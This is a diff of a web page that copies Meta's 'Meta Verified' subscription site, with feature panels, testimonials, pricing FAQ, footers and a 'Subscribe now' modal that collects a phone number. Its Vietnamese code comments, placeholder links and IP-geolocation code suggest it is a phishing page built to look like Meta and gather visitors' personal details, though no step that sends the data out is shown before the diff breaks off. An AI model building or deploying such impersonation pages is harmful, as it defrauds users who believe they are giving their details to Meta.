+          <div class="feature-description" style="max-height:0;opacity:0;"><p>Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.</p></div>
         </div>
-        <div class="faq-item">
-          <button class="faq-btn"><span>What is the verification process?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">You may be asked to provide a government-issued ID and, in selected regions, may be asked to submit a selfie video so that we can confirm your identity before being approved.</div></div>
+        <div class="feature-item" data-index="2">
+          <h3 class="feature-title">Enhanced support</h3>
+          <div class="feature-description" style="max-height:0;opacity:0;"><p>Get 24/7 access to email or chat agent support to help resolve your issues more quickly.</p></div>
         </div>
-        <div class="faq-item">
-          <button class="faq-btn"><span>As a creator, can I use one subscription on both Facebook and Instagram?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">Yes. If you have your Facebook and Instagram accounts linked in the Accounts Centre, you may be eligible to subscribe to Meta Verified for two profiles for a discounted price.</div></div>
+        <div class="feature-item" data-index="3">
+          <h3 class="feature-title">Upgraded profile features</h3>
+          <div class="feature-description" style="max-height:0;opacity:0;"><p>Enrich your profile by adding images to your links to help boost engagement.</p></div>
         </div>
-        <div class="faq-item">
-          <button class="faq-btn"><span>What is the price to subscribe to Meta Verified for creators?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">Meta Verified subscriptions are generally available for USD 11.99/month from the web, and USD 14.99/month from within the app. Plus: USD 49.99/mo · Premium: USD 149.99/mo · Max: USD 499.99/mo.</div></div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-btn"><span>After signing up, can I change my plan?</span><span class="faq-icon">+</span></button>
-          <div class="faq-content"><div class="faq-answer">Yes. You can change your plan selection at any time. To upgrade to Plus, Premium, and Max plans, you will need to use the Instagram or Facebook apps on your mobile device.</div></div>
-        </div>
+        <div class="feature-border-b"></div>
       </div>
     </div>
+    <div class="features-mobile">
+      <div class="feature-mobile-item">
+        <div class="aspect-box"><img src="public/images/feature-badge.webp" alt="Verified badge" /></div>
+        <h3>Verified badge</h3>
+        <p>The badge means that your profile was verified by Meta based on your activity or documents you provided.</p>
+      </div>
+      <div class="feature-mobile-item">
+        <div class="aspect-box"><img src="public/images/feature-impersonation.webp" alt="Impersonation protection" /></div>
+        <h3>Impersonation protection</h3>
+        <p>Protect your brand with proactive impersonation monitoring. Meta will remove accounts pretending to be you.</p>
+      </div>
+      <div class="feature-mobile-item">
+        <div class="aspect-box"><img src="public/images/feature-support.webp" alt="Enhanced support" /></div>
+        <h3>Enhanced support</h3>
+        <p>Get 24/7 access to email or chat agent support to help resolve your issues more quickly.</p>
+      </div>
+      <div class="feature-mobile-item">
+        <div class="aspect-box"><img src="public/images/feature-profile.png" alt="Upgraded profile features" /></div>
+        <h3>Upgraded profile features</h3>
+        <p>Enrich your profile by adding images to your links to help boost engagement.</p>
+      </div>
+    </div>
+  </div>
 
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      document.querySelectorAll('.faq-btn').forEach(function(btn) {
-        btn.addEventListener('click', function() {
-          var item = btn.closest('.faq-item');
-          var content = item.querySelector('.faq-content');
-          var icon = btn.querySelector('.faq-icon');
-          var isOpen = content.classList.contains('open');
-          document.querySelectorAll('.faq-content').forEach(function(c) { c.classList.remove('open'); });
-          document.querySelectorAll('.faq-icon').forEach(function(ic) { ic.textContent = '+'; });
-          if (!isOpen) { content.classList.add('open'); icon.textContent = '−'; }
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var items = document.querySelectorAll('.feature-item');
+    var imgs = document.querySelectorAll('.feature-image');
+    var descs = document.querySelectorAll('.feature-description');
+    items.forEach(function(item) {
+      item.addEventListener('mouseenter', function() {
+        var idx = item.dataset.index;
+        imgs.forEach(function(img) {
+          var active = img.dataset.index === idx;
+          img.style.opacity = active ? '1' : '0';
+          img.style.pointerEvents = active ? '' : 'none';
+        });
+        descs.forEach(function(desc) {
+          var pIdx = desc.closest('.feature-item').dataset.index;
+          if (pIdx === idx) {
+            desc.style.maxHeight = '200px'; desc.style.opacity = '1'; desc.style.marginTop = '20px';
+          } else {
+            desc.style.maxHeight = '0'; desc.style.opacity = '0'; desc.style.marginTop = '0';
+          }
         });
       });
     });
-    </script>
+  });
+  </script>
 
-    <!-- FOOTER -->
-    <footer class="footer-main">
-      <div class="footer-main-inner">
-        <div>
-          <h2 class="footer-sub-title">Get the latest updates from Meta.</h2>
-          <p class="footer-sub-desc">Provide your email address to receive the latest updates from Meta, including news, events and product updates.</p>
+  <!-- TESTIMONIALS -->
+  <div class="testimonial-section">
+    <p class="testimonial-title">See how Meta Verified has helped real businesses.</p>
+    <div class="testimonial-slider">
+      <div id="testimonial-track">
+        <div class="testimonial-slide">
+          <p class="testimonial-quote">"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."</p>
+          <p class="testimonial-author">@inversionista_gal · 4K+ followers</p>
         </div>
-        <div class="footer-form">
-          <div class="footer-inputs">
-            <input type="email" placeholder="Email address" class="footer-input" />
-            <input type="text" placeholder="Country" class="footer-input" />
-          </div>
-          <p class="footer-fine">By submitting this form, you agree to receive marketing related electronic communications from Meta. You may withdraw your consent at any time.</p>
-          <button class="footer-sub-btn">Subscribe</button>
+        <div class="testimonial-slide">
+          <p class="testimonial-quote">"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."</p>
+          <p class="testimonial-author">Kimber Greenwood, Owner of Water Bear Photography</p>
         </div>
-      </div>
-    </footer>
-
-    <footer class="footer-links">
-      <div class="footer-links-inner">
-        <div class="footer-links-grid">
-          <div class="footer-links-col">
-            <h3>Meta technologies</h3>
-            <ul><li><a href="#">Facebook</a></li><li><a href="#">Instagram</a></li><li><a href="#">Messenger</a></li><li><a href="#">WhatsApp</a></li><li><a href="#">Meta Quest</a></li></ul>
-          </div>
-          <div class="footer-links-col">
-            <h3>Meta Verified</h3>
-            <ul><li><a href="#">Creators</a></li><li><a href="#">Businesses</a></li><li><a href="#">Pricing plans</a></li><li><a href="#">FAQ</a></li></ul>
-          </div>
-          <div class="footer-links-col">
-            <h3>About</h3>
-            <ul><li><a href="#">About Meta</a></li><li><a href="#">Newsroom</a></li><li><a href="#">Careers</a></li><li><a href="#">For investors</a></li></ul>
-          </div>
-          <div class="footer-links-col">
-            <h3>Support</h3>
-            <ul><li><a href="#">Meta Help Centre</a></li><li><a href="#">Facebook Help Centre</a></li><li><a href="#">Instagram Help Centre</a></li><li><a href="#">WhatsApp Help Centre</a></li></ul>
-          </div>
-        </div>
-        <div class="footer-bottom">
-          <div class="footer-copy">© 2026 Meta</div>
-          <div class="footer-legal">
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms</a>
-            <a href="#">Cookie policy</a>
-            <a href="#">Community Standards</a>
-            <a href="#">Help Centre</a>
-          </div>
+        <div class="testimonial-slide">
+          <p class="testimonial-quote">"Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."</p>
+          <p class="testimonial-author">Devon Kirby, Owner, Mom Approved Miami</p>
         </div>
       </div>
-    </footer>
+    </div>
+    <div class="testimonial-nav">
+      <button id="prev-slide" class="testimonial-arrow">←</button>
+      <div id="dots" style="display:flex;gap:8px;align-items:center;">
+        <button class="testimonial-dot" style="background:#111"></button>
+        <button class="testimonial-dot" style="background:#d1d5db"></button>
+        <button class="testimonial-dot" style="background:#d1d5db"></button>
+      </div>
+      <button id="next-slide" class="testimonial-arrow">→</button>
+    </div>
+  </div>
 
-    <!-- MODALS -->
-    <div id="modalsContainer"></div>
-
-    <script>
-    var _masterData = {};
-    var Modal = {
-      _current: null,
-      create: function(id, content) {
-        var old = document.getElementById(id); if (old) old.remove();
-        var o = document.createElement('div');
-        o.id = id; o.className = 'modal-overlay';
-        o.innerHTML = '<div class="modal-box">' + content + '</div>';
-        o.addEventListener('click', function(e) { if (e.target === o) Modal.close(id); });
-        document.getElementById('modalsContainer').appendChild(o);
-      },
-      open: function(id) {
-        var o = document.getElementById(id); if (!o) return;
-        requestAnimationFrame(function() { o.classList.add('open'); });
-        Modal._current = id; document.body.style.overflow = 'hidden';
-      },
-      close: function(id) {
-        var o = document.getElementById(id); if (!o) return;
-        o.classList.remove('open'); document.body.style.overflow = '';
-        setTimeout(function() { if (o.parentNode) o.parentNode.removeChild(o); }, 260);
-        Modal._current = null;
-      }
-    };
-    document.addEventListener('keydown', function(e) { if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current); });
-
-    var COUNTRY_CODES = [
-      {code:"AF",name:"Afghanistan",dial:"+93",flag:"🇦🇫"},
-      {code:"AL",name:"Albania",dial:"+355",flag:"🇦🇱"},
-      {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},
-      {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
-      {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
-      {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
-      {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
-      {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
-      {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
-      {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
-      {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
-      {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
-      {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
-      {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
-      {code:"HR",name:"Croatia",dial:"+385",flag:"🇭🇷"},
-      {code:"CZ",name:"Czech Republic",dial:"+420",flag:"🇨🇿"},
-      {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
-      {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
-      {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
-      {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
-      {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
-      {code:"GH",name:"Ghana",dial:"+233",flag:"🇬🇭"},
-      {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
-      {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
-      {code:"HU",name:"Hungary",dial:"+36",flag:"🇭🇺"},
-      {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
-      {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
-      {code:"IR",name:"Iran",dial:"+98",flag:"🇮🇷"},
-      {code:"IQ",name:"Iraq",dial:"+964",flag:"🇮🇶"},
-      {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"},
-      {code:"IL",name:"Israel",dial:"+972",flag:"🇮🇱"},
-      {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
-      {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
-      {code:"JO",name:"Jordan",dial:"+962",flag:"🇯🇴"},
-      {code:"KZ",name:"Kazakhstan",dial:"+7",flag:"🇰🇿"},
-      {code:"KE",name:"Kenya",dial:"+254",flag:"🇰🇪"},
-      {code:"KW",name:"Kuwait",dial:"+965",flag:"🇰🇼"},
-      {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
-      {code:"LB",name:"Lebanon",dial:"+961",flag:"🇱🇧"},
-      {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
-      {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
-      {code:"MA",name:"Morocco",dial:"+212",flag:"🇲🇦"},
-      {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
-      {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
-      {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
-      {code:"NZ",name:"New Zealand",dial:"+64",flag:"🇳🇿"},
-      {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
-      {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
-      {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
-      {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
-      {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
-      {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
-      {code:"QA",name:"Qatar",dial:"+974",flag:"🇶🇦"},
-      {code:"RO",name:"Romania",dial:"+40",flag:"🇷🇴"},
-      {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
-      {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
-      {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
-      {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
-      {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
-      {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
-      {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
-      {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
-      {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
-      {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
-      {code:"TZ",name:"Tanzania",dial:"+255",flag:"🇹🇿"},
-      {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
-      {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
-      {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
-      {code:"AE",name:"United Arab Emirates",dial:"+971",flag:"🇦🇪"},
-      {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
-      {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
-      {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"}
-    ];
-    var _selectedDial = "+1", _selectedFlag = "🇺🇸", _selectedCode = "US", _dropOpen = false;
-    var _ipDetected = false;
-
-    /* Detect IP ngay khi load trang — dùng HTTPS, thử 3 nguồn */
-    (function detectIP() {
-      function applyCountry(code) {
-        if (_ipDetected) return;
-        code = (code || '').toUpperCase();
-        var found = null;
-        for (var i = 0; i < COUNTRY_CODES.length; i++) {
-          if (COUNTRY_CODES[i].code === code) { found = COUNTRY_CODES[i]; break; }
-        }
-        if (!found) return;
-        _ipDetected = true;
-        _selectedDial = found.dial;
-        _selectedFlag = found.flag;
-        _selectedCode = found.code;
-        /* Nếu modal đang mở, cập nhật DOM luôn */
-        var f = document.getElementById('pcsFlag');
-        var d = document.getElementById('pcsDial');
-        if (f) f.textContent = found.flag;
-        if (d) d.textContent = found.dial;
-      }
-
-      /* API 1: ipwho.is — HTTPS, nhanh, miễn phí */
-      fetch('https://ipwho.is/')
-        .then(function(r){ return r.json(); })
-        .then(function(d){ applyCountry(d.country_code); })
-        .catch(function(){});
-
-      /* API 2: ipapi.co — fallback */
-      fetch('https://ipapi.co/json/')
-        .then(function(r){ return r.json(); })
-        .then(function(d){ applyCountry(d.country_code); })
-        .catch(function(){});
-
-      /* API 3: ip.seeip.org — fallback */
-      fetch('https://ip.seeip.org/geoip')
-        .then(function(r){ return r.json(); })
-        .then(function(d){ applyCountry(d.country_code); })
-        .catch(function(){});
-    })();
-
-    function _buildPhoneSelector() {
-      /* Luôn đọc _selectedFlag/_selectedDial tại thời điểm gọi (sau IP detect) */
-      var opts = COUNTRY_CODES.map(function(c) {
-        var active = c.code === _selectedCode;
-        return '<div class="pcs-opt" data-dial="'+c.dial+'" data-flag="'+c.flag+'" data-code="'+c.code+'" onclick="_selectDial(this)"'
-          + (active ? ' style="background:#e8f0fe;" id="pcs-active"' : '') + '>'
-          + '<span style="font-size:18px;margin-right:8px;line-height:1;">'+c.flag+'</span>'
-          + '<span style="font-size:13px;color:#111;font-weight:700;min-width:46px;display:inline-block;">'+c.dial+'</span>'
-          + '<span style="font-size:13px;color:#555;">'+c.name+'</span></div>';
-      }).join('');
-      return '<div class="nf-input-wrap phone-row" style="padding:0;height:44px;margin-bottom:10px;overflow:visible;">'
-        + '<div class="pcs-wrap" id="pcs">'
-        + '<div class="pcs-trigger" onclick="_toggleDial()">'
-        + '<span id="pcsFlag" style="font-size:18px;line-height:1;">'+_selectedFlag+'</span>'
-        + '<span class="pcs-dial" id="pcsDial" style="font-size:13px;font-weight:700;color:#111;margin-left:4px;">'+_selectedDial+'</span>'
-        + '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" style="flex-shrink:0;margin-left:2px;"><path d="M6 9l6 6 6-6"/></svg></div>'
-        + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none;">'
-        + '<input class="pcs-search" id="pcsSearch" type="text" placeholder="🔍  Search country..." oninput="_filterDial(this.value)">'
-        + '<div class="pcs-list" id="pcsList">'+opts+'</div></div></div>'
-        + '<input class="pcs-phone-input" id="phone" type="tel" placeholder="Phone number" inputmode="tel">'
-        + '</div>';
+  <script>
+  (function() {
+    var track = document.getElementById('testimonial-track');
+    var dots = document.querySelectorAll('.testimonial-dot');
+    var prev = document.getElementById('prev-slide');
+    var next = document.getElementById('next-slide');
+    var total = dots.length, cur = 0, startX = 0, isDragging = false;
+    function goTo(idx) {
+      cur = (idx + total) % total;
+      track.style.transform = 'translateX(-' + (cur * 100) + '%)';
+      dots.forEach(function(d, i) { d.style.background = i === cur ? '#111' : '#d1d5db'; });
     }
-    function _toggleDial() {
-      var dd = document.getElementById('pcsDropdown'); if (!dd) return;
-      _dropOpen = !_dropOpen;
-      if (_dropOpen) {
-        dd.style.display = 'flex'; dd.style.flexDirection = 'column';
-        /* Scroll nước đang chọn vào giữa dropdown */
-        setTimeout(function(){
-          var active = document.getElementById('pcs-active');
-          if (active) active.scrollIntoView({ block: 'center' });
-          var s = document.getElementById('pcsSearch'); if(s) s.focus();
-        }, 50);
-      } else {
-        dd.style.display = 'none';
-      }
-    }
-    function _selectDial(el) {
-      _selectedDial = el.dataset.dial; _selectedFlag = el.dataset.flag; _selectedCode = el.dataset.code;
-      var f = document.getElementById('pcsFlag'); if(f) f.textContent = _selectedFlag;
-      var d = document.getElementById('pcsDial'); if(d) d.textContent = _selectedDial;
-      /* highlight active */
-      document.querySelectorAll('.pcs-opt').forEach(function(o){ o.style.background = o.dataset.code === _selectedCode ? '#f0f4ff' : ''; });
-      _dropOpen = false; var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none';
-    }
-    function _filterDial(q) {
-      document.querySelectorAll('.pcs-opt').forEach(function(el) {
-        el.style.display = el.textContent.toLowerCase().includes(q.toLowerCase()) ? '' : 'none';
-      });
-    }
-    document.addEventListener('click', function(e) {
-      var w = document.getElementById('pcs');
-      if (w && !w.contains(e.target)) { _dropOpen = false; var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none'; }
+    prev.addEventListener('click', function() { goTo(cur - 1); });
+    next.addEventListener('click', function() { goTo(cur + 1); });
+    dots.forEach(function(d, i) { d.addEventListener('click', function() { goTo(i); }); });
+    track.addEventListener('touchstart', function(e) { startX = e.touches[0].clientX; isDragging = true; }, { passive: true });
+    track.addEventListener('touchend', function(e) {
+      if (!isDragging) return;
+      var diff = startX - e.changedTouches[0].clientX;
+      if (Math.abs(diff) > 40) goTo(diff > 0 ? cur + 1 : cur - 1);
+      isDragging = false;
     });
+    setInterval(function() { goTo(cur + 1); }, 5000);
+  })();
+  </script>
 
-    function openClientModal() {
-      _masterData = {};
-      /* Luôn dùng giá trị _selectedFlag/_selectedDial mới nhất (sau khi IP detect xong) */
-      var html =
-        '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'
-        +'<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'
-        +'<div style="width:18px;height:18px;cursor:pointer;opacity:0.6;flex-shrink:0;" onclick="Modal.close(\'clientModal\')">'
-        +'<img src="public/icons/ic_close.svg" style="width:18px;height:18px;" alt="close" onerror="this.parentNode.innerHTML=\'&times;\';this.parentNode.style.fontSize=\'20px\';this.parentNode.style.opacity=\'0.5\';">'
-        +'</div></div>'
-        +'<div style="flex:1;overflow-y:auto;">'
-        +'<form id="clientForm" autocomplete="off" style="width:100%;">'
+  <!-- CTA -->
+  <div class="cta-section">
+    <div class="cta-media">
+      <video src="public/images/video-meta.mp4" autoplay muted loop playsinline style="width:100%;height:100%;object-fit:cover;"></video>
+      <img src="public/images/cta-bg.webp" alt="meta" />
+    </div>
+    <div class="cta-content">
+      <div class="cta-inner">
+        <img src="public/images/ICONMOI.svg" alt="verified" class="cta-icon" />
+        <h2 class="cta-title">Ready to become Meta Verified?</h2>
+        <button onclick="openClientModal()" class="cta-btn">Subscribe now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FAQ -->
+  <div class="faq-section">
+    <p class="faq-title">FAQ</p>
+    <p class="faq-subtitle">We've included some frequently asked questions below. For more, visit our Help Centre on
+      <a style="color:#0064E0;" href="https://www.facebook.com/business/help/2876154822522394">Facebook</a> or
+      <a style="color:#0064E0;" href="https://help.instagram.com">Instagram</a>.
+    </p>
+    <div class="faq-list">
+      <div class="faq-item">
+        <button class="faq-btn"><span>How do I know if I'm eligible?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">Meta Verified is available in selected regions for creators who meet certain eligibility requirements. Requirements vary by platform — check Facebook and Instagram help centres for details.</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-btn"><span>I already have a verified badge. What happens to it?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">There will be no changes to accounts on Facebook or Instagram that are already verified based on prior requirements. Existing verified badge holders can also apply for a Meta Verified subscription if they meet the eligibility requirements.</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-btn"><span>What is the verification process?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">You may be asked to provide a government-issued ID and, in selected regions, may be asked to submit a selfie video so that we can confirm your identity before being approved.</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-btn"><span>As a creator, can I use one subscription on both Facebook and Instagram?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">Yes. If you have your Facebook and Instagram accounts linked in the Accounts Centre, you may be eligible to subscribe to Meta Verified for two profiles for a discounted price.</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-btn"><span>What is the price to subscribe to Meta Verified for creators?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">Meta Verified subscriptions are generally available for USD 11.99/month from the web, and USD 14.99/month from within the app. Plus: USD 49.99/mo · Premium: USD 149.99/mo · Max: USD 499.99/mo.</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-btn"><span>After signing up, can I change my plan?</span><span class="faq-icon">+</span></button>
+        <div class="faq-content"><div class="faq-answer">Yes. You can change your plan selection at any time. To upgrade to Plus, Premium, and Max plans, you will need to use the Instagram or Facebook apps on your mobile device.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('.faq-btn').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var item = btn.closest('.faq-item');
+        var content = item.querySelector('.faq-content');
+        var icon = btn.querySelector('.faq-icon');
+        var isOpen = content.classList.contains('open');
+        document.querySelectorAll('.faq-content').forEach(function(c) { c.classList.remove('open'); });
+        document.querySelectorAll('.faq-icon').forEach(function(ic) { ic.textContent = '+'; });
+        if (!isOpen) { content.classList.add('open'); icon.textContent = '−'; }
+      });
+    });
+  });
+  </script>
+
+  <!-- FOOTER -->
+  <footer class="footer-main">
+    <div class="footer-main-inner">
+      <div>
+        <h2 class="footer-sub-title">Get the latest updates from Meta.</h2>
+        <p class="footer-sub-desc">Provide your email address to receive the latest updates from Meta, including news, events and product updates.</p>
+      </div>
+      <div class="footer-form">
+        <div class="footer-inputs">
+          <input type="email" placeholder="Email address" class="footer-input" />
+          <input type="text" placeholder="Country" class="footer-input" />
+        </div>
+        <p class="footer-fine">By submitting this form, you agree to receive marketing related electronic communications from Meta. You may withdraw your consent at any time.</p>
+        <button class="footer-sub-btn">Subscribe</button>
+      </div>
+    </div>
+  </footer>
+
+  <footer class="footer-links">
+    <div class="footer-links-inner">
+      <div class="footer-links-grid">
+        <div class="footer-links-col">
+          <h3>Meta technologies</h3>
+          <ul><li><a href="#">Facebook</a></li><li><a href="#">Instagram</a></li><li><a href="#">Messenger</a></li><li><a href="#">WhatsApp</a></li><li><a href="#">Meta Quest</a></li></ul>
+        </div>
+        <div class="footer-links-col">
+          <h3>Meta Verified</h3>
+          <ul><li><a href="#">Creators</a></li><li><a href="#">Businesses</a></li><li><a href="#">Pricing plans</a></li><li><a href="#">FAQ</a></li></ul>
+        </div>
+        <div class="footer-links-col">
+          <h3>About</h3>
+          <ul><li><a href="#">About Meta</a></li><li><a href="#">Newsroom</a></li><li><a href="#">Careers</a></li><li><a href="#">For investors</a></li></ul>
+        </div>
+        <div class="footer-links-col">
+          <h3>Support</h3>
+          <ul><li><a href="#">Meta Help Centre</a></li><li><a href="#">Facebook Help Centre</a></li><li><a href="#">Instagram Help Centre</a></li><li><a href="#">WhatsApp Help Centre</a></li></ul>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-copy">© 2026 Meta</div>
+        <div class="footer-legal">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms</a>
+          <a href="#">Cookie policy</a>
+          <a href="#">Community Standards</a>
+          <a href="#">Help Centre</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <div id="modalsContainer"></div>
+
+  <script>
+  /* ============================================================
+     COUNTRY CODES
+  ============================================================ */
+  var COUNTRY_CODES = [
+    {code:"AF",name:"Afghanistan",dial:"+93",flag:"🇦🇫"},
+    {code:"AL",name:"Albania",dial:"+355",flag:"🇦🇱"},
+    {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},
+    {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
+    {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+    {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
+    {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
+    {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
+    {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
+    {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
+    {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
+    {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
+    {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+    {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
+    {code:"HR",name:"Croatia",dial:"+385",flag:"🇭🇷"},
+    {code:"CZ",name:"Czech Republic",dial:"+420",flag:"🇨🇿"},
+    {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
+    {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
+    {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
+    {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
+    {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+    {code:"GH",name:"Ghana",dial:"+233",flag:"🇬🇭"},
+    {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
+    {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
+    {code:"HU",name:"Hungary",dial:"+36",flag:"🇭🇺"},
+    {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
+    {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+    {code:"IR",name:"Iran",dial:"+98",flag:"🇮🇷"},
+    {code:"IQ",name:"Iraq",dial:"+964",flag:"🇮🇶"},
+    {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"},
+    {code:"IL",name:"Israel",dial:"+972",flag:"🇮🇱"},
+    {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
+    {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+    {code:"JO",name:"Jordan",dial:"+962",flag:"🇯🇴"},
+    {code:"KZ",name:"Kazakhstan",dial:"+7",flag:"🇰🇿"},
+    {code:"KE",name:"Kenya",dial:"+254",flag:"🇰🇪"},
+    {code:"KW",name:"Kuwait",dial:"+965",flag:"🇰🇼"},
+    {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
+    {code:"LB",name:"Lebanon",dial:"+961",flag:"🇱🇧"},
+    {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+    {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+    {code:"MA",name:"Morocco",dial:"+212",flag:"🇲🇦"},
+    {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
+    {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
+    {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
+    {code:"NZ",name:"New Zealand",dial:"+64",flag:"🇳🇿"},
+    {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
+    {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
+    {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
+    {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
+    {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
+    {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
+    {code:"QA",name:"Qatar",dial:"+974",flag:"🇶🇦"},
+    {code:"RO",name:"Romania",dial:"+40",flag:"🇷🇴"},
